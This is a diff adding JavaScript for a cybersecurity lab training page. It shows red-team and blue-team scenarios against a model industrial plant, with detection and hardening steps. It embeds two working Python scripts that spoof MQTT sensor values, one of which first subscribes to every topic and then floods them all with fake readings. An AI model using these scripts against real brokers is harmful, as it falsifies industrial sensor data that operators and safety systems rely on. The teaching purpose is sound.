@@ -1,0 +1,202 @@
+const domainTitles = {
+  airport: "Airport",
+  "water-treatment": "Water Treatment",
+  industry: "Industry",
+  hospital: "Hospital",
+  banking: "Banking",
+  "power-grid": "Power Grid",
+  "toll-plaza": "Toll Plaza",
+  "data-center": "Data Center",
+  "stock-market": "Stock Market",
+  metro: "Metro",
+  warehouse: "Warehouse"
+};
+
+const industryDashboardUrl = "http://172.16.17.204:1880/ui/#!/4?socketid=zxL7Ex3NoOUjbRHMAAAB";
+
+const scriptCode = {
+  single: `import paho.mqtt.client as mqtt
+import time
+
+# MQTT broker details
+broker_address = "172.16.17.207"
+topic = "ZPHS01B/NO2"
+
+client = mqtt.Client()
+client.connect(broker_address)
+
+try:
+    while True:
+        client.publish(topic, "100")
+        print(f"Data '100' sent to topic {topic}")
+        time.sleep(0.1)
+except KeyboardInterrupt:
+    print("Process interrupted")
+finally:
+    client.disconnect()`,
+  all: `import paho.mqtt.client as mqtt
+import time
+
+broker_address = "172.16.17.207"
+attack_value = "999"
+scan_duration = 10
+attack_delay = 0.02
+
+seen_topics = set()
+
+def on_message(client, userdata, message):
+    topic = message.topic
+    if topic not in seen_topics:
+        print(f"[SCAN] Found topic: {topic}")
+        seen_topics.add(topic)
+
+scan_client = mqtt.Client()
+scan_client.on_message = on_message
+scan_client.connect(broker_address)
+scan_client.subscribe("#")
+scan_client.loop_start()
+
+print(f"[*] Scanning for attack surfaces for {scan_duration} seconds...")
+time.sleep(scan_duration)
+scan_client.loop_stop()
+scan_client.disconnect()
+
+print(f"[+] Found {len(seen_topics)} topics: {seen_topics}")
+
+attack_client = mqtt.Client()
+attack_client.connect(broker_address)
+
+try:
+    print("[!] Launching MQTT spoofing simulation...")
+    while True:
+        for topic in seen_topics:
+            attack_client.publish(topic, attack_value)
+            print(f"[SIM] Sent fake value '{attack_value}' to topic '{topic}'")
+            time.sleep(attack_delay)
+except KeyboardInterrupt:
+    print("\\n[!] Simulation stopped by user.")
+finally:
+    attack_client.disconnect()`
+};
+
+const industryScenarios = {
+  red: {
+    kicker: "Red Team Scenario",
+    title: "Industry Attack Surface Training",
+    summary: "Students simulate a lab-only MQTT sensor spoofing incident from a Kali machine and observe fake industrial values appearing live in the Industry dashboard.",
+    badges: ["Kali machine", "MQTT broker 172.16.17.207", "Node-RED dashboard"],
+    steps: [
+      "Connect Kali to the Phygital Lab network.",
+      "Open the Industry dashboard and keep it visible during the simulation.",
+      "Run single.py first to spoof only the NO2 topic and watch one gauge change.",
+      "Run all.py to scan visible MQTT topics and publish fake values to all discovered topics.",
+      "Stop the script with Ctrl+C and record which values changed."
+    ],
+    commands: `cd /home/kali/documents
+python3 -m pip install paho-mqtt
+python3 single.py
+python3 all.py`,
+    links: [
+      { label: "Open Industry Dashboard", href: industryDashboardUrl }
+    ]
+  },
+  blue: {
+    kicker: "Blue Team Scenario",
+    title: "Industry Mitigation And Response",
+    summary: "Students defend the Industry model by detecting MQTT spoofing, stopping the simulation safely, restoring trusted values, and documenting hardening steps.",
+    badges: ["Detect", "Contain", "Recover", "Harden"],
+    steps: [
+      "Detect: open the Industry dashboard and identify impossible or sudden values such as NO2, CO2, VOC, gas, or humidity spikes.",
+      "Confirm: compare dashboard readings with the physical model and normal operating range to confirm the values are fake.",
+      "Contain: ask the Red Team/Kali operator to stop the running script with Ctrl+C. If the attacker machine is unknown, isolate the suspected Kali host from the lab network.",
+      "Recover: wait for real sensor values to return, then refresh the dashboard and confirm gauges are stable.",
+      "Document: record affected MQTT topics, fake values, time observed, suspected source IP, and recovery action.",
+      "Harden: recommend MQTT authentication, disable anonymous publish, apply topic ACLs, restrict port 1883, segment the Industry network, and add alert thresholds in Node-RED."
+    ],
+    actionTitle: "Mitigation Steps",
+    commands: `1. Stop the attack script on Kali:
+   Press Ctrl+C in the terminal running single.py or all.py
+
+2. If the source is unknown:
+   Disconnect/isolate the suspicious Kali machine from the lab network
+
+3. Validate recovery:
+   Refresh the Industry dashboard
+   Confirm sensor values return to normal
+
+4. Hardening checklist:
+   Enable MQTT username/password
+   Disable anonymous publish
+   Add topic ACLs
+   Restrict broker port 1883 to trusted hosts
+   Add Node-RED alerts for impossible values`,
+    links: [
+      { label: "Open Industry Dashboard", href: industryDashboardUrl }
+    ]
+  }
+};
+
+function getScenario(domain, mode) {
+  if (domain === "industry") return industryScenarios[mode] || industryScenarios.red;
+  const title = domainTitles[domain] || "Model";
+  const isRed = mode === "red";
+  return {
+    kicker: isRed ? "Red Team Scenario" : "Blue Team Scenario",
+    title: isRed ? `${title} Attack Surface Training` : `${title} Monitoring And Response`,
+    summary: "This page is ready for a model-specific lab scenario. Add the script, dashboard link, and student instructions for this model when available.",
+    badges: isRed ? ["Lab scenario", "CTF-ready", "Student drill"] : ["Monitoring", "Evidence", "Response"],
+    steps: isRed
+      ? [
+        "Review the model overview and identify approved lab targets.",
+        "Run only the authorized training script for this model.",
+        "Observe the model dashboard and capture evidence.",
+        "Stop the simulation and hand findings to the Blue Team."
+      ]
+      : [
+        "Monitor the model dashboard for abnormal behavior.",
+        "Compare dashboard signals with physical model state.",
+        "Record affected devices, values, and time.",
+        "Recommend controls and recovery steps."
+      ],
+    actionTitle: isRed ? "Scenario Status" : "Mitigation Status",
+    commands: isRed ? "No Python script has been added for this model yet." : "No model-specific mitigation playbook has been added yet.",
+    links: []
+  };
+}
+
+function renderScenario() {
+  const params = new URLSearchParams(window.location.search);
+  const domain = params.get("domain") || "industry";
+  const mode = params.get("mode") || "red";
+  const isIndustry = domain === "industry";
+  const scenario = getScenario(domain, mode);
+
+  document.title = `${scenario.title} - Phygital Lab`;
+  document.getElementById("scenario-kicker").textContent = scenario.kicker;
+  document.getElementById("scenario-title").textContent = scenario.title;
+  document.getElementById("scenario-summary").textContent = scenario.summary;
+  document.getElementById("scenario-badges").innerHTML = scenario.badges.map((badge) => `<span>${badge}</span>`).join("");
+  document.getElementById("scenario-steps").innerHTML = scenario.steps.map((step) => `<li>${step}</li>`).join("");
+  document.getElementById("scenario-action-title").textContent = scenario.actionTitle || "Kali Commands";
+  document.getElementById("scenario-commands").textContent = scenario.commands;
+  document.getElementById("scenario-command-note").hidden = !isIndustry;
+  document.getElementById("scenario-code-section").hidden = !isIndustry;
+  document.getElementById("scenario-links").innerHTML = scenario.links.map((link) => (
+    `<button class="scenario-dashboard-btn" type="button" data-href="${link.href}">${link.label}</button>`
+  )).join("");
+}
+
+document.addEventListener("DOMContentLoaded", () => {
+  renderScenario();
+  document.querySelectorAll("[data-code-target]").forEach((button) => {
+    button.addEventListener("click", () => {
+      const target = button.dataset.codeTarget;
+      document.getElementById("scenario-code-view").textContent = scriptCode[target] || "Code not available.";
+    });
+  });
+  document.getElementById("scenario-links").addEventListener("click", (event) => {
+    const button = event.target.closest("[data-href]");
+    if (!button) return;
+    window.open(button.dataset.href, "_blank", "noopener");
+  });
+});
